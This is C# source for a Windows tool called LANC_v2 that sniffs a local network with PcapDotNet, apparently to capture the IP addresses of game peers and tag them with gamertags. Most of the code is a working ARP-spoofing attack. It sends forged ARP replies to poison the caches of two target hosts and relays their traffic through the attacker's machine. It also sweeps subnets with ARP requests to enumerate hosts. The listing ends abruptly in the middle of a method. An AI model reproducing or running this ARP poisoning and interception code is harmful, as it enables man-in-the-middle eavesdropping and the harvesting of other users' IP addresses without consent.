using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Resources;
using System.Text;
using System.Threading;
using System.Windows.Forms;
namespace LANC_v2
{
    public partial class Form1 : Form
    {
        private bool exitRequest;
        private IList<LivePacketDevice> allDevices;
        private BindingList<ListObject> list = new BindingList<ListObject>();
        private BindingList<LocalMachine> lmlist = new BindingList<LocalMachine>();
        private BackgroundWorker gtbw = new BackgroundWorker();
        private Database db;
        private bool databaseChanged = false;
        private bool running = false;
        private Thread mainThread;
        private BackgroundWorker arpbw = new BackgroundWorker();
        private Settings settings;
        private PacketCommunicator communicator;
        private bool isArpSpoofing = false;
        private string myMacAddress = "";
        private string machineIP = "";
        private string gateway = "";
        private string fromIP = "";
        private string fromMac = "";
        private string toIP = "";
        private string toMac = "";
        private Dictionary<string, string> IPtoMac;
        private List<string> localIPs1;
        private List<string> localIPs2;
        private MACLookup macl;
        private PortLookup pl;
        private List<string> domains;
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
        public Form1()
        {
            try
            {
                InitializeComponent();
                allDevices = LivePacketDevice.AllLocalMachine;
                string[] description = new string[allDevices.Count];
                IPtoMac = new Dictionary<string, string>();
                localIPs1 = new List<string>();
                localIPs2 = new List<string>();
                if (allDevices.Count != 0)
                {
                    for (int i = 0; i != allDevices.Count; i++)
                    {
                        description[i] = allDevices[i].Description;
                    }
                    logInComboBox1.DataSource = description;
                }
                else
                {
                    MessageBox.Show("No interfaces found! Make sure WinPcap is installed.");
                    Application.Exit();
                }
                logInComboBox1.SelectedIndex = 0;
                exitRequest = false;
                logInLabel8.Text = string.Concat("Database: ", Environment.CurrentDirectory, "\\database.dat");
                settings = new Settings("settings.ini");
                logInLabel9.Text = "URL: " + settings.settings["shellURL"];
                db = new Database(string.Concat(Environment.CurrentDirectory, "\\database.dat"));
                macl = new MACLookup(string.Concat(Environment.CurrentDirectory, "\\oui.dat"));
                macl.loadFromFile();
                pl = new PortLookup(string.Concat(Environment.CurrentDirectory, "\\ports.dat"));
                pl.loadFromFile();
                domains = new List<string>();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        private delegate void AddGridCallback(ListObject obj);
        private delegate void AddGridLMCallback(LocalMachine obj);
        private delegate void AppendText7Callback(string text);
        private delegate void AppendTextCallback(string text);
        private delegate string CurrentGTCallback();
        private delegate string CurrentIPCallback();
        private delegate string CurrentLabelCallback();
        private delegate int DropdownIndex2Callback();
        private delegate int DropdownIndex3Callback();
        private delegate int DropdownIndexCallback();
        private delegate string DropdownValue2Callback();
        private delegate string DropdownValue3Callback();
        private delegate void RefreshD2Callback();
        private delegate void RefreshD3Callback();
        private delegate void RefreshGridCallback();
        private delegate void RefreshLMGridCallback();
        private delegate void SetCurrentGTCallback(string text);
        private delegate void SetDSCallback(BindingList<ListObject> list);
        private delegate void SetLMDSCallback(BindingList<LocalMachine> lmlist);
        private delegate void SetText2Callback(string text);
        private delegate void ShowContextMenuCallback(Point p);
        private delegate void ShowGroup5Callback();
        private delegate string logInNormalTextBox1TextCallback();
        private delegate string logInNormalTextBox2TextCallback();
        private delegate string TextBox4TextCallback();
        private delegate string logInNormalTextBox4TextCallback();
        private delegate string TextBox9TextCallback();
        private void addGamertagToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            LabelForm labelForm = new LabelForm(CurrentGT());
            if (labelForm.ShowDialog(this) == System.Windows.Forms.DialogResult.OK)
            {
                SetCurrentGT(labelForm.gamertag);
            }
            labelForm.Dispose();
        }
        private void AddGrid(ListObject obj)
        {
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    bool flag = false;
                    TimeSpan utcNow = DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0);
                    for (int i = 0; i < list.Count; i++)
                    {
                        if (!(list[i].ipSource != obj.ipSource ? true : !(list[i].ipDest == obj.ipDest)))
                        {
                            flag = true;
                            ListObject item = list[i];
                            item.packetCount = item.packetCount + 1;
                            list[i].packetDelt = utcNow.Seconds;
                        }
                        else if (logInCheckBox3.Checked)
                        {
                            if (utcNow.Seconds - list[i].packetDelt > 10)
                            {
                                list.RemoveAt(i);
                            }
                        }
                    }
                    if (!flag)
                    {
                        obj.packetCount = 1;
                        obj.packetDelt = utcNow.Seconds;
                        list.Add(obj);
                    }
                }
                else
                {
                    AddGridCallback addGridCallback = new AddGridCallback(AddGrid);
                    object[] objArray = new object[] { obj };
                    base.Invoke(addGridCallback, objArray);
                }
            }
            catch
            {
            }
        }
        private void AddGrid(object obj)
        {
            AddGrid((ListObject)obj);
        }
        private void AddGridLM(LocalMachine obj)
        {
            try
            {
                if (!dataGridView2.InvokeRequired)
                {
                    bool flag = false;
                    for (int i = 0; i < lmlist.Count; i++)
                    {
                        if (lmlist[i].macAddress == obj.macAddress)
                        {
                            flag = true;
                        }
                    }
                    if (!flag)
                    {
                        lmlist.Add(obj);
                    }
                }
                else
                {
                    AddGridLMCallback addGridLMCallback = new AddGridLMCallback(AddGridLM);
                    object[] objArray = new object[] { obj };
                    base.Invoke(addGridLMCallback, objArray);
                }
            }
            catch
            {
            }
        }
        private void AddToGrid(object sender, DoWorkEventArgs e)
        {
            ListObject argument = e.Argument as ListObject;
            BackgroundWorker backgroundWorker = new BackgroundWorker();
            AddGrid(argument);
        }
        private void AddToLMGrid(object sender, DoWorkEventArgs e)
        {
            LocalMachine argument = e.Argument as LocalMachine;
            BackgroundWorker backgroundWorker = new BackgroundWorker();
            AddGridLM(argument);
            RefreshLMGridIndex();
        }
        private void AppendText(string text)
        {
            try
            {
                if (exitRequest)
                {
                    Thread.CurrentThread.Abort();
                }
                else if (!textBox7.InvokeRequired)
                {
                    textBox7.AppendText(text);
                }
                else
                {
                    AppendTextCallback appendTextCallback = new AppendTextCallback(AppendText);
                    object[] objArray = new object[] { text };
                    base.Invoke(appendTextCallback, objArray);
                }
            }
            catch
            {
            }
        }
        private void AppendText7(string text)
        {
            try
            {
                if (exitRequest)
                {
                    Thread.CurrentThread.Abort();
                }
                else if (!textBox7.InvokeRequired)
                {
                    textBox7.AppendText(text);
                }
                else
                {
                    AppendText7Callback appendText7Callback = new AppendText7Callback(AppendText7);
                    object[] objArray = new object[] { text };
                    base.Invoke(appendText7Callback, objArray);
                }
            }
            catch
            {
            }
        }
        public void ARPListen(object sender, DoWorkEventArgs e)
        {
            try
            {
                communicator.ReceivePackets(0, new HandlePacket(ARPPacketHandler));
            }
            catch
            {
            }
        }
        private void ARPPacketHandler(Packet packet)
        {
            if ((packet.Ethernet.EtherType != EthernetType.Arp ? false : packet.Ethernet.Arp.Operation == ArpOperation.Reply))
            {
                if (!localIPs1.Contains(packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString()))
                {
                    List<string> strs = localIPs1;
                    IpV4Address senderProtocolIpV4Address = packet.Ethernet.Arp.SenderProtocolIpV4Address;
                    strs.Add(senderProtocolIpV4Address.ToString());
                    List<string> strs1 = localIPs2;
                    senderProtocolIpV4Address = packet.Ethernet.Arp.SenderProtocolIpV4Address;
                    strs1.Add(senderProtocolIpV4Address.ToString());
                    Dictionary<string, string> ptoMac = IPtoMac;
                    senderProtocolIpV4Address = packet.Ethernet.Arp.SenderProtocolIpV4Address;
                    ptoMac.Add(senderProtocolIpV4Address.ToString(), packet.Ethernet.Source.ToString());
                }
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            lmlist.Clear();
            RefreshLMGridIndex();
        }
        private void button3_Click(object sender, EventArgs e)
        {
            list.Clear();
        }
        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {
        }
        private void copyIPMenuItem1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(CurrentIP());
        }
        private string CurrentGT()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1[0, dataGridView1.SelectedCells[0].RowIndex].Value;
                }
                else
                {
                    CurrentGTCallback currentGTCallback = new CurrentGTCallback(CurrentGT);
                    value = (string)base.Invoke(currentGTCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private string CurrentIP()
        {
            string value = "";
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    value = (string)dataGridView1.SelectedRows[0].Cells[2].Value;
                }
                else
                {
                    CurrentIPCallback currentIPCallback = new CurrentIPCallback(CurrentIP);
                    value = (string)base.Invoke(currentIPCallback);
                }
            }
            catch
            {
                value = "Error";
            }
            return value;
        }
        private void dataGridView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Right)
            {
                DataGridView.HitTestInfo hitTestInfo = dataGridView1.HitTest(e.X, e.Y);
                if (hitTestInfo.Type == DataGridViewHitTestType.Cell)
                {
                    if (dataGridView1.Rows.Count != 0)
                    {
                        dataGridView1.CurrentCell = dataGridView1[hitTestInfo.ColumnIndex, hitTestInfo.RowIndex];
                        ShowContextMenu(base.PointToScreen(dataGridView1.PointToClient(e.Location)));
                    }
                }
            }
        }
        private int DropdownIndex()
        {
            int selectedIndex;
            if (!logInComboBox1.InvokeRequired)
            {
                selectedIndex = logInComboBox1.SelectedIndex;
            }
            else
            {
                DropdownIndexCallback dropdownIndexCallback = new DropdownIndexCallback(DropdownIndex);
                selectedIndex = (int)base.Invoke(dropdownIndexCallback);
            }
            return selectedIndex;
        }
        private int DropdownIndex2()
        {
            int selectedIndex;
            if (!logInComboBox2.InvokeRequired)
            {
                selectedIndex = logInComboBox2.SelectedIndex;
            }
            else
            {
                DropdownIndex2Callback dropdownIndex2Callback = new DropdownIndex2Callback(DropdownIndex2);
                selectedIndex = (int)base.Invoke(dropdownIndex2Callback);
            }
            return selectedIndex;
        }
        private int DropdownIndex3()
        {
            int selectedIndex;
            if (!logInComboBox3.InvokeRequired)
            {
                selectedIndex = logInComboBox3.SelectedIndex;
            }
            else
            {
                DropdownIndex3Callback dropdownIndex3Callback = new DropdownIndex3Callback(DropdownIndex3);
                selectedIndex = (int)base.Invoke(dropdownIndex3Callback);
            }
            return selectedIndex;
        }
        private string DropdownValue2()
        {
            string selectedValue;
            if (!logInComboBox2.InvokeRequired)
            {
                selectedValue = (string)logInComboBox2.SelectedValue;
            }
            else
            {
                DropdownValue2Callback dropdownValue2Callback = new DropdownValue2Callback(DropdownValue2);
                selectedValue = (string)base.Invoke(dropdownValue2Callback);
            }
            return selectedValue;
        }
        private string DropdownValue3()
        {
            string selectedValue;
            if (!logInComboBox3.InvokeRequired)
            {
                selectedValue = (string)logInComboBox3.SelectedValue;
            }
            else
            {
                DropdownValue3Callback dropdownValue3Callback = new DropdownValue3Callback(DropdownValue3);
                selectedValue = (string)base.Invoke(dropdownValue3Callback);
            }
            return selectedValue;
        }
        private string GetMacAddress()
        {
            string str;
            NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
            int num = 0;
            while (true)
            {
                if (num < (int)allNetworkInterfaces.Length)
                {
                    NetworkInterface networkInterface = allNetworkInterfaces[num];
                    foreach (IPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
                    {
                        if ((!(unicastAddress.Address.ToString() == machineIP) || !(machineIP != "0.0.0.0") ? false : machineIP != ""))
                        {
                            byte[] addressBytes = networkInterface.GetPhysicalAddress().GetAddressBytes();
                            gateway = networkInterface.GetIPProperties().GatewayAddresses[0].Address.ToString();
                            str = BitConverter.ToString(addressBytes).Replace("-", ":");
                            return str;
                        }
                    }
                    num++;
                }
                else
                {
                    str = "";
                    break;
                }
            }
            return str;
        }
        private void GridThread(object sender, DoWorkEventArgs e)
        {
            RefreshGridIndex();
            Thread.Sleep(1000);
        }
        private List<byte> IPToByteList(string IP)
        {
            List<byte> nums = new List<byte>();
            string[] strArrays = IP.Split(new char[] { '.' });
            for (int i = 0; i < (int)strArrays.Length; i++)
            {
                nums.Add(Convert.ToByte(strArrays[i], 10));
            }
            return nums;
        }
        private bool isARP(Packet packet)
        {
            bool flag;
            flag = (packet.Ethernet.EtherType != EthernetType.Arp ? false : true);
            return flag;
        }
        private bool isMDNS(Packet packet)
        {
            bool flag;
            bool str;
            if (packet.Ethernet.IpV4.Udp.SourcePort.ToString() != "5353")
            {
                str = true;
            }
            else
            {
                ushort destinationPort = packet.Ethernet.IpV4.Udp.DestinationPort;
                str = !(destinationPort.ToString() == "5353");
            }
            if (str)
            {
                flag = false;
            }
            else if ((int)packet.Buffer.Length <= 44)
            {
                flag = false;
            }
            else
            {
                flag = (packet.Buffer[44] != 0 ? false : true);
            }
            return flag;
        }
        public void Listen()
        {
            PacketDevice item = allDevices[DropdownIndex()];
            SetDS(list);
            SetLMDS(lmlist);
            try
            {
                communicator = item.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1);
                if (isArpSpoofing)
                {
                    arpbw.DoWork += new DoWorkEventHandler(SendArp);
                    arpbw.RunWorkerAsync();
                }
                BackgroundWorker backgroundWorker = new BackgroundWorker();
                backgroundWorker.DoWork += new DoWorkEventHandler(GridThread);
                backgroundWorker.RunWorkerAsync();
                communicator.ReceivePackets(0, new HandlePacket(PacketHandler));
            }
            catch
            {
            }
        }
        private void LMGridThread(object sender, DoWorkEventArgs e)
        {
            while (running)
            {
                RefreshLMGridIndex();
                Thread.Sleep(1000);
            }
        }
        private List<byte> MacToByteList(string mac)
        {
            mac = mac.Trim();
            List<byte> nums = new List<byte>();
            string[] strArrays = mac.Split(new char[] { ':' });
            for (int i = 0; i < (int)strArrays.Length; i++)
            {
                nums.Add(Convert.ToByte(strArrays[i], 16));
            }
            return nums;
        }
        private bool PacketFilter(Packet packet)
        {
            bool flag;
            if (!(logInNormalTextBox1Text() == packet.Ethernet.IpV4.Udp.SourcePort.ToString() ? true : !(logInNormalTextBox2Text() != "")))
            {
                flag = false;
            }
            else if (!(logInNormalTextBox3Text() == packet.Ethernet.IpV4.Udp.DestinationPort.ToString() ? true : !(logInNormalTextBox3Text() != "")))
            {
                flag = false;
            }
            else if ((logInNormalTextBox2Text() == packet.Ethernet.IpV4.Source.ToString() ? true : !(logInNormalTextBox1Text() != "")))
            {
                flag = ((logInNormalTextBox4Text() == packet.Ethernet.IpV4.Destination.ToString() ? true : !(logInNormalTextBox4Text() != "")) ? true : false);
            }
            else
            {
                flag = false;
            }
            return flag;
        }
        private void PacketForward(object sender, DoWorkEventArgs e)
        {
            byte[] buffer;
            string[] strArrays;
            int i;
            string str;
            MacAddress source;
            char[] chrArray;
            bool flag;
            bool str1;
            bool flag1;
            Packet argument = e.Argument as Packet;
            if (argument.Ethernet.IpV4.Source.ToString() != toIP)
            {
                flag = true;
            }
            else
            {
                source = argument.Ethernet.Source;
                flag = !(source.ToString() != myMacAddress);
            }
            if (!flag)
            {
                buffer = argument.Buffer;
                string str2 = fromMac;
                chrArray = new char[] { ':' };
                strArrays = str2.Split(chrArray);
                for (i = 0; i < (int)strArrays.Length; i++)
                {
                    buffer[i] = Convert.ToByte(string.Concat("0x", strArrays[i]), 16);
                }
                str = myMacAddress;
                chrArray = new char[] { ':' };
                strArrays = str.Split(chrArray);
                for (i = 0; i < (int)strArrays.Length; i++)
                {
                    buffer[i + 6] = Convert.ToByte(string.Concat("0x", strArrays[i]), 16);
                }
                communicator.SendPacket(new Packet(buffer, DateTime.Now, DataLinkKind.Ethernet));
            }
            if (argument.Ethernet.IpV4.Destination.ToString() != toIP)
            {
                str1 = true;
            }
            else
            {
                source = argument.Ethernet.Source;
                str1 = !(source.ToString() != myMacAddress);
            }
            if (!str1)
            {
                buffer = argument.Buffer;
                string str3 = toMac;
                chrArray = new char[] { ':' };
                strArrays = str3.Split(chrArray);
                for (i = 0; i < (int)strArrays.Length; i++)
                {
                    buffer[i] = Convert.ToByte(string.Concat("0x", strArrays[i]), 16);
                }
                str = myMacAddress;
                chrArray = new char[] { ':' };
                strArrays = str.Split(chrArray);
                for (i = 0; i < (int)strArrays.Length; i++)
                {
                    buffer[i + 6] = Convert.ToByte(string.Concat("0x", strArrays[i]), 16);
                }
                communicator.SendPacket(new Packet(buffer, DateTime.Now, DataLinkKind.Ethernet));
            }
            if (argument.Ethernet.EtherType != EthernetType.Arp)
            {
                flag1 = true;
            }
            else
            {
                source = argument.Ethernet.Source;
                flag1 = !(source.ToString() != myMacAddress);
            }
            if (!flag1)
            {
                BackgroundWorker backgroundWorker = new BackgroundWorker();
                backgroundWorker.DoWork += new DoWorkEventHandler(SendArp);
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void PacketHandler(Packet packet)
        {
            BackgroundWorker backgroundWorker;
            IpV4Address targetProtocolIpV4Address;
            MacAddress source;
            ushort destinationPort;
            if (exitRequest)
            {
                mainThread.Abort();
            }
            else
            {
                if (isArpSpoofing)
                {
                    BackgroundWorker backgroundWorker1 = new BackgroundWorker();
                    backgroundWorker1.DoWork += new DoWorkEventHandler(PacketForward);
                    backgroundWorker1.RunWorkerAsync(packet);
                }
                if (isARP(packet))
                {
                    targetProtocolIpV4Address = packet.Ethernet.Arp.TargetProtocolIpV4Address;
                    string str = targetProtocolIpV4Address.ToString();
                    targetProtocolIpV4Address = packet.Ethernet.Arp.TargetProtocolIpV4Address;
                    string str1 = string.Concat(str.Substring(0, targetProtocolIpV4Address.ToString().LastIndexOf('.')), ".1");
                    if (!domains.Contains(str1))
                    {
                        domains.Add(str1);
                        AppendText7(string.Concat(str1, "\n"));
                    }
                    targetProtocolIpV4Address = packet.Ethernet.Arp.SenderProtocolIpV4Address;
                    string str2 = targetProtocolIpV4Address.ToString();
                    targetProtocolIpV4Address = packet.Ethernet.Arp.SenderProtocolIpV4Address;
                    string str3 = string.Concat(str2.Substring(0, targetProtocolIpV4Address.ToString().LastIndexOf('.')), ".1");
                    if (!domains.Contains(str3))
                    {
                        domains.Add(str3);
                        AppendText7(string.Concat(str3, "\n"));
                    }
                }
                if (isMDNS(packet))
                {
                    LocalMachine localMachine = new LocalMachine();
                    targetProtocolIpV4Address = packet.Ethernet.IpV4.Source;
                    localMachine.IP = targetProtocolIpV4Address.ToString();
                    source = packet.Ethernet.Source;
                    localMachine.macAddress = source.ToString();
                    localMachine.macVendor = macl.lookup(localMachine.macAddress);
                    List<byte> nums = new List<byte>();
                    if ((int)packet.Buffer.Length > 54)
                    {
                        for (int i = 54; i < (int)packet.Buffer.Length; i++)
                        {
                            nums.Add(packet.Buffer[i]);
                        }
                    }
                    Encoding aSCII = Encoding.ASCII;
                    localMachine.Name = aSCII.GetString(nums.ToArray<byte>());
                    backgroundWorker = new BackgroundWorker();
                    backgroundWorker.DoWork += new DoWorkEventHandler(AddToLMGrid);
                    backgroundWorker.RunWorkerAsync(localMachine);
                }
                if (PacketFilter(packet))
                {
                    IpV4Datagram ipV4 = packet.Ethernet.IpV4;
                    UdpDatagram udp = ipV4.Udp;
                    ListObject listObject = new ListObject()
                    {
                        ipDest = ipV4.Destination.ToString(),
                        ipSource = ipV4.Source.ToString()
                    };
                    if (!(listObject.ipSource == machineIP ? false : !(listObject.ipSource == toIP)))
                    {
                        listObject.ipDisplay = listObject.ipDest;
                        source = packet.Ethernet.Destination;
                        listObject.macAddress = source.ToString();
                        listObject.macVendor = macl.lookup(listObject.macAddress);
                        PortLookup portLookup = pl;
                        destinationPort = packet.Ethernet.IpV4.Udp.DestinationPort;
                        listObject.protocol = portLookup.lookup(destinationPort.ToString());
                        if (listObject.protocol == "")
                        {
                            PortLookup portLookup1 = pl;
                            destinationPort = packet.Ethernet.IpV4.Udp.SourcePort;
                            listObject.protocol = portLookup1.lookup(destinationPort.ToString());
                        }
                    }
                    else if (!(listObject.ipDest == machineIP ? false : !(listObject.ipDest == toIP)))
                    {
                        listObject.ipDisplay = listObject.ipSource;
                        source = packet.Ethernet.Source;
                        listObject.macAddress = source.ToString();
                        listObject.macVendor = macl.lookup(listObject.macAddress);
                        PortLookup portLookup2 = pl;
                        destinationPort = packet.Ethernet.IpV4.Udp.DestinationPort;
                        listObject.protocol = portLookup2.lookup(destinationPort.ToString());
                        if (listObject.protocol == "")
                        {
                            PortLookup portLookup3 = pl;
                            destinationPort = packet.Ethernet.IpV4.Udp.SourcePort;
                            listObject.protocol = portLookup3.lookup(destinationPort.ToString());
                        }
                    }
                    else if (!(toIP != ""))
                    {
                        listObject.ipDisplay = "Multiple";
                        listObject.macAddress = "Multiple";
                        listObject.macVendor = "Multiple";
                    }
                    else
                    {
                        listObject.ipDisplay = toIP;
                        listObject.macAddress = "Multiple";
                        listObject.macVendor = "Multiple";
                    }
                    destinationPort = ipV4.Udp.DestinationPort;
                    listObject.portDest = destinationPort.ToString();
                    destinationPort = ipV4.Udp.SourcePort;
                    listObject.portSource = destinationPort.ToString();
                    if (db.db.ContainsKey(listObject.ipDisplay))
                    {
                        List<string> item = db.db[listObject.ipDisplay];
                        if (item.Count > 0)
                        {
                            listObject.label = item[0];
                        }
                    }
                    backgroundWorker = new BackgroundWorker();
                    backgroundWorker.DoWork += new DoWorkEventHandler(AddToGrid);
                    backgroundWorker.RunWorkerAsync(listObject);
                }
            }
        }
        private void RefreshD2()
        {
            try
            {
                if (!logInComboBox2.InvokeRequired)
                {
                    logInComboBox2.Update();
                    logInComboBox2.Refresh();
                }
                else
                {
                    base.Invoke(new RefreshD2Callback(RefreshD2));
                }
            }
            catch
            {
            }
        }
        private void RefreshD3()
        {
            try
            {
                if (!logInComboBox3.InvokeRequired)
                {
                    logInComboBox3.Update();
                    logInComboBox3.Refresh();
                }
                else
                {
                    base.Invoke(new RefreshD3Callback(RefreshD3));
                }
            }
            catch
            {
            }
        }
        private void RefreshGridIndex()
        {
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    dataGridView1.Update();
                    dataGridView1.EndEdit();
                    dataGridView1.Refresh();
                }
                else
                {
                    base.Invoke(new RefreshGridCallback(RefreshGridIndex));
                }
            }
            catch
            {
            }
        }
        private void RefreshLMGridIndex()
        {
            try
            {
                if (!dataGridView2.InvokeRequired)
                {
                    dataGridView2.Update();
                    dataGridView2.EndEdit();
                    dataGridView2.Refresh();
                }
                else
                {
                    base.Invoke(new RefreshLMGridCallback(RefreshLMGridIndex));
                }
            }
            catch
            {
            }
        }
        private void Send255ARPs(object sender, DoWorkEventArgs e)
        {
            localIPs1.Clear();
            localIPs2.Clear();
            IPtoMac.Clear();
            if (!domains.Contains(gateway))
            {
                domains.Add(gateway);
            }
            foreach (string domain in domains)
            {
                string str = domain;
                string str1 = str.Substring(0, str.LastIndexOf('.') + 1);
                for (int i = 1; i < 255; i++)
                {
                    string str2 = string.Concat(str1, i);
                    MacAddress macAddress = new MacAddress(myMacAddress);
                    MacAddress macAddress1 = new MacAddress("ff:ff:ff:ff:ff:ff");
                    EthernetLayer ethernetLayer = new EthernetLayer()
                    {
                        Source = macAddress,
                        Destination = macAddress1
                    };
                    EthernetLayer ethernetLayer1 = ethernetLayer;
                    ArpLayer arpLayer = new ArpLayer()
                    {
                        SenderHardwareAddress = new ReadOnlyCollection<byte>(MacToByteList(myMacAddress)),
                        SenderProtocolAddress = new ReadOnlyCollection<byte>(IPToByteList(machineIP)),
                        TargetHardwareAddress = new ReadOnlyCollection<byte>(MacToByteList("00:00:00:00:00:00")),
                        TargetProtocolAddress = new ReadOnlyCollection<byte>(IPToByteList(str2)),
                        Operation = ArpOperation.Request,
                        ProtocolType = EthernetType.IpV4
                    };
                    ILayer[] layerArray = new ILayer[] { ethernetLayer1, arpLayer };
                    Packet packets = (new PacketBuilder(layerArray)).Build(DateTime.Now);
                    communicator.SendPacket(packets);
                    Thread.Sleep(10);
                }
                Thread.Sleep(1000);
            }
            Thread.Sleep(1000);
            communicator.Break();
            localIPs1.Sort();
            localIPs2.Sort();
            logInComboBox2.DataSource = null;
            logInComboBox3.DataSource = null;
            logInComboBox2.DataSource = localIPs1;
            logInComboBox3.DataSource = localIPs2;
            ShowGroup5();
            System.Windows.Forms.Cursor.Current = Cursors.Default;
        }
        private void SendArp(object sender, DoWorkEventArgs e)
        {
            SendArpPacket(toMac, myMacAddress, myMacAddress, fromIP, toMac, toIP, "08 06 00 01 08 00 06 04 00 02");
            SendArpPacket(fromMac, myMacAddress, myMacAddress, toIP, fromMac, fromIP, "08 06 00 01 08 00 06 04 00 02");
            SendArpPacket(myMacAddress, myMacAddress, fromMac, fromIP, myMacAddress, machineIP, "08 06 00 01 08 00 06 04 00 02");
        }
        private byte[] SendArpPacket(string destinationAddress, string sourceAddress, string sourcePhysics, string sourceIP, string destinationPhysics, string destinationIP, string filler)
        {
            string str;
            int i;
            List<byte> nums = new List<byte>();
            char[] chrArray = new char[] { ':' };
            string[] strArrays = destinationAddress.Split(chrArray);
            for (i = 0; i < (int)strArrays.Length; i++)
            {
                str = strArrays[i];
                nums.Add(Convert.ToByte(string.Concat("0x", str), 16));
            }
            chrArray = new char[] { ':' };
            strArrays = sourceAddress.Split(chrArray);
            for (i = 0; i < (int)strArrays.Length; i++)
            {
                str = strArrays[i];
                nums.Add(Convert.ToByte(string.Concat("0x", str), 16));
            }
            chrArray = new char[] { ' ' };
            strArrays = filler.Split(chrArray);
            for (i = 0; i < (int)strArrays.Length; i++)
            {
                str = strArrays[i];
                nums.Add(Convert.ToByte(string.Concat("0x", str), 16));
            }
            chrArray = new char[] { ':' };
            strArrays = sourcePhysics.Split(chrArray);
            for (i = 0; i < (int)strArrays.Length; i++)
            {
                str = strArrays[i];
                nums.Add(Convert.ToByte(string.Concat("0x", str), 16));
            }
            chrArray = new char[] { '.' };
            strArrays = sourceIP.Split(chrArray);
            for (i = 0; i < (int)strArrays.Length; i++)
            {
                nums.Add(Convert.ToByte(strArrays[i], 10));
            }
            chrArray = new char[] { ':' };
            strArrays = destinationPhysics.Split(chrArray);
            for (i = 0; i < (int)strArrays.Length; i++)
            {
                str = strArrays[i];
                nums.Add(Convert.ToByte(string.Concat("0x", str), 16));
            }
            chrArray = new char[] { '.' };
            strArrays = destinationIP.Split(chrArray);
            for (i = 0; i < (int)strArrays.Length; i++)
            {
                nums.Add(Convert.ToByte(strArrays[i], 10));
            }
            byte[] array = nums.ToArray();
            string str1 = "";
            str1 = BitConverter.ToString(array);
            byte[] numArray = new byte[5];
            byte[] numArray1 = new byte[] { 0, 29, 216, 178, 143, 66, 0, 35, 21, 85, 127, 152, 8, 6, 0, 1, 8, 0, 6, 4, 0, 2, 0, 35, 21, 85, 127, 152, 192, 168, 1, 1, 0, 29, 216, 178, 143, 66, 192, 168, 1, 31, 0, 0 };
            Packet packets = new Packet(array, DateTime.Now, DataLinkKind.Ethernet);
            communicator.SendPacket(packets);
            return packets.Buffer;
        }
        private void SendReverseArpPackets()
        {
            SendArpPacket(toMac, myMacAddress, fromMac, fromIP, toMac, toIP, "08 06 00 01 08 00 06 04 00 02");
            SendArpPacket(fromMac, myMacAddress, toMac, toIP, fromMac, fromIP, "08 06 00 01 08 00 06 04 00 02");
        }
        public void SetCurrentGT(string text)
        {
            int rowIndex;
            List<string> strs;
            databaseChanged = true;
            try
            {
                if (dataGridView1.InvokeRequired)
                {
                    SetCurrentGTCallback setCurrentGTCallback = new SetCurrentGTCallback(SetCurrentGT);
                    object[] objArray = new object[] { text };
                    base.Invoke(setCurrentGTCallback, objArray);
                }
                else if (!(text == ""))
                {
                    rowIndex = dataGridView1.SelectedCells[0].RowIndex;
                    dataGridView1[0, rowIndex].Value = text;
                    if (!db.db.ContainsKey(text))
                    {
                        strs = new List<string>()
						{
							text
						};
                        db.db.Add(dataGridView1[1, rowIndex].Value.ToString(), strs);
                    }
                    else
                    {
                        strs = db.db[dataGridView1[1, rowIndex].Value.ToString()];
                        strs.Add(text);
                        db.db[dataGridView1[1, rowIndex].Value.ToString()] = strs;
                    }
                }
                else
                {
                    rowIndex = dataGridView1.SelectedCells[0].RowIndex;
                    dataGridView1[0, rowIndex].Value = text;
                    if (db.db.ContainsKey(dataGridView1[1, rowIndex].Value.ToString()))
                    {
                        db.db.Remove(dataGridView1[1, rowIndex].Value.ToString());
                    }
                }
            }
            catch
            {
            }
        }
        private void SetDS(BindingList<ListObject> list)
        {
            if (!dataGridView1.InvokeRequired)
            {
                dataGridView1.DataSource = null;
                dataGridView1.DataSource = list;
                dataGridView1.Columns["ipDisplay"].HeaderText = "Ext IP";
                dataGridView1.Columns["ipDisplay"].Width = 95;
                dataGridView1.Columns["macAddress"].HeaderText = "MAC Address";
                dataGridView1.Columns["macAddress"].Width = 95;
                dataGridView1.Columns["macVendor"].HeaderText = "HWD Vendor";
                dataGridView1.Columns["ipSource"].HeaderText = "Source IP";
                dataGridView1.Columns["ipDest"].HeaderText = "Dest IP";
                dataGridView1.Columns["portSource"].HeaderText = "Source Port";
                dataGridView1.Columns["portSource"].Width = 95;
                dataGridView1.Columns["portDest"].HeaderText = "Dest Port";
                dataGridView1.Columns["portDest"].Width = 95;
                dataGridView1.Columns["protocol"].HeaderText = "Protocol";
                dataGridView1.Columns["label"].HeaderText = "Label";
                dataGridView1.Columns["label"].Width = 50;
                dataGridView1.Columns["GeoLocation"].HeaderText = "GeoLocation";
                dataGridView1.Columns["GeoLocation"].Width = 100;
                dataGridView1.Columns["packetCount"].HeaderText = "Packets";
                dataGridView1.Columns["packetCount"].Width = 60;
            }
            else
            {
                SetDSCallback setDSCallback = new SetDSCallback(SetDS);
                object[] objArray = new object[] { list };
                base.Invoke(setDSCallback, objArray);
            }
        }
        private void SetLMDS(BindingList<LocalMachine> lmlist)
        {
            if (!dataGridView2.InvokeRequired)
            {
                dataGridView2.DataSource = null;
